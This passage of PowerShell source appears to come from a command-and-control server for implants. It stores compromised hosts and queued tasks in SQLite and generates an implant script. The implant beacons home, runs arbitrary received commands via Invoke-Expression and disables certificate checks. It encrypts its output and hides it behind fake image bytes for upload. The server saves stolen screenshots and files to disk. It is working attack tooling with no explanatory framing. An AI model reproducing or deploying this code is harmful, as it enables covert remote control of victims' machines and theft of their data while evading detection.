            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = "$(Get-Date)"
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
        }

	    $autorunresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
        
        if ($autorunresults -ne $null){
			Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='implant-core.ps1' WHERE RandomURI='$randomuri'"|Out-Null
			$query = "INSERT INTO NewTasks (RandomURI, Command)
			VALUES (@RandomURI, @Command)"
			
			Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			RandomURI = $randomuri
			Command   = "LoadModule implant-core.ps1"
			} | Out-Null
			
            foreach ($i in $autorunresults) {
                $taskee = $i.Task
                			
                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
			    RandomURI = $randomuri
			    Command   = $taskee
                } | Out-Null
			
            }
		}

        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'
$payload = "' + "$payload"+'"

function getimgdata($cmdoutput) {
    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
    
    try {$image = $icoimage|get-random}catch{}

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen

    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImagePlusPad = New-Object byte[] $maxbyteslen
    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
    $CombinedBytes = $ImagePlusPadBytes.length

    $CmdBytes = $cmdoutput
    $CmdBytesLen = $CmdBytes.Length

    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
    $FullBuffer = New-Object byte[] $CombinedByteSize

    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
    $FullBufferSize = $FullBuffer.length
    return $FullBuffer
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$URI= "'+$randomuri+'"
$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
$ServerClean = "'+$ipv4address+":"+$serverport+'"

while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = '+$urlstring+'
    $RandomURI = Get-Random $URLS
    $Server = "$ServerClean/$RandomURI$URI"
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
    
    while($ReadCommand) {
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $error.clear()
                        if  ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            try {
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient).UploadData("$Server"+"?"+"$Response", $UploadBytes)|out-null
                            } catch{}
                        }
                    } 
            }
            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient).UploadData("$Server"+"?"+"$ModuleLoaded", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient).UploadData("$Server"+"?"+"$ReadCommand", $UploadBytes)|out-null
            } catch {}
            }
        }
    break
    }
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
$message =[Convert]::ToBase64String($Bytes)

    }

    $randomuriagents = Invoke-SqliteQuery -DataSource $Database -Query 'SELECT RandomURI FROM Implants' -As SingleValue
            
    foreach ($ranuri in $randomuriagents) 
    {
    if ($ranuri -ne $null) 
    {
        $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
        $key = $im_results.Key
        $hostname = $im_results.Hostname
        $currenttime = (Get-Date)
        $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
        # send multi commands to the client 
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults))
        {
            $message = $null
            foreach ($i in $multicmdresults) {
                $taskid = $i.Command
                $taskidtime = $i.TaskID

                if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
                    Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
                    if  ($taskid.ToLower().startswith('upload-file')) {
                    Write-Host -Object "Uploading File" -ForegroundColor Yellow
                    } else {
                    Write-Host -Object $taskid -ForegroundColor Yellow
                    }
                }
                if ($taskid.ToLower().StartsWith("loadmodule")) 
                {
                    $modulename = $taskid -replace 'LoadModule ', '' 
                    if (Test-Path "$PoshPath\Modules\$modulename") {
                    $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
                    # ensure the module name 
                    $module = "LoadModule"+$module
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $module
                    } else {
                        $message = $module 
                    }
                    } else {
                    Write-Host "Error finding module"
                    }
                }
                else 
                {
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $taskid
                    } else {
                        $message = $taskid 
                    }
                }
                Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
            }

            if ($multicmdresults.Count -gt 1){
                $message = "multicmd" + $message
            }
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring                    
        }
        
        # send the default command/response if there is no command
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
        { 
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $message = 'fvdsghfdsyyh'
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring
        } 

        # a completed command has returned to the c2 server
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'POST')) 
        { 
            $responseStream = $request.InputStream 
            $targetStream = New-Object -TypeName System.IO.MemoryStream 
            $buffer = new-object byte[] 10KB 
            $count = $responseStream.Read($buffer,0,$buffer.length) 
            $downloadedBytes = $count 
            while ($count -gt 0) 
            { 
                $targetStream.Write($buffer, 0, $count) 
                $count = $responseStream.Read($buffer,0,$buffer.length) 
                $downloadedBytes = $downloadedBytes + $count 
            } 

            $len = $targetStream.length
            $size = $len + 1
            $size2 = $len -1
            $buffer = New-Object byte[] $size
            $targetStream.Position = 0
            $targetStream.Read($buffer, 0, $targetStream.Length)|Out-null

            $targetStream.Flush()
            $targetStream.Close() 
            $targetStream.Dispose()

            # if you want to look at the image that is transfered back each time :)
            # [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
            $encryptedString = $buffer[1500..$size2]
            $cookiesin = $request.Cookies -replace 'SessionID=', ''

            $urlstrip = ($request.Url) -split "[?]"
            $cookieplaintext = Decrypt-String $key $urlstrip[1]
            
            try {
            $backToPlainText = Decrypt-String2 $key $encryptedString
            }
            catch{             
            $backToPlainText = "Unable to decrypt message from host"
            $error.clear()
            $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
            }
            
            # if the task was a screenshot, dump it directly to disk
            if ($cookieplaintext.tolower().startswith('get-screenshot'))
            {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                try{
                $randomimageid = Get-RandomURI -Length 15
                $imagepath = "$global:newdir\downloads\$randomimageid.png"
                #Convert Base64 to Image
                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
                $imageBytes = [Convert]::FromBase64String($backToPlainText)
                $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
                $ms.Write($imageBytes, 0, $imageBytes.Length)
                $image = [System.Drawing.Image]::FromStream($ms, $true)
                $image.Save("$imagepath")
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                }
                catch {
                $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
                Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                }
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
            }
            # if the task was to download a file, dump it directly to disk
            if  ($cookieplaintext.tolower().startswith('download-file'))
            {
                try {
                $file = split-path $cookieplaintext -leaf
                $file = $file -replace "'", ""
                $file = $file.split('\.')[-1]
                $ramdomfileext = Get-RandomURI -Length 15
                $targetfile = "$global:newdir\downloads\$ramdomfileext.$file"   
                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''        
                $fileBytes = [Convert]::FromBase64String($backToPlainText)
                [io.file]::WriteAllBytes($targetfile, $fileBytes)
                write-host "Downloaded file: $targetfile" -ForegroundColor Green

                } catch {
                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
                }
                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
            }

            if ($backToPlainText -match '123456(.+?)654321')
            {$cmdlineinput = $matches[1]}
            $Query = 'INSERT
                INTO CompletedTasks (TaskID, RandomURI, Command, Output, Prompt)
            VALUES (@TaskID, @RandomURI, @Command, @Output, @Prompt)'

            Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                TaskID    = (Get-Date)
                RandomURI = "$ranuri"
                Command   = $cookieplaintext
                Output    = $backToPlainText -replace '123456(.+?)654321', ''
                Prompt    = $cmdlineinput
            }|out-null
            $message = "     "
        }
    }
    }

    # if a web request comes in that is not for the c2 server, send default 404 response
    if (!$message) {
        $message = $httpresponse
        Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
        Write-Output $request | Out-File $global:newdir\Webserver.log -Append
    }
    
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $response.StatusCode = 200
    $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    $response.Headers.Add("Pragma", "no-cache")
    $response.Headers.Add("Expires", 0)
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
    $message = $null
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$taskiddb" -as PSObject
    if ($resultsdb)
    {
    $ranuri = $resultsdb.RandomURI
    $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
    $implanthost = $im_result.User
    $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue

        $taskcompledtime = $resultsdb.TaskID
        Write-Host "Command returned against host:" $im_result.Hostname $im_result.Domain "($taskcompledtime)" -ForegroundColor Green
        Write-Host -Object $resultsdb.Output -ForegroundColor Green
        $taskiddb ++
    }
}

$listener.Stop()
}
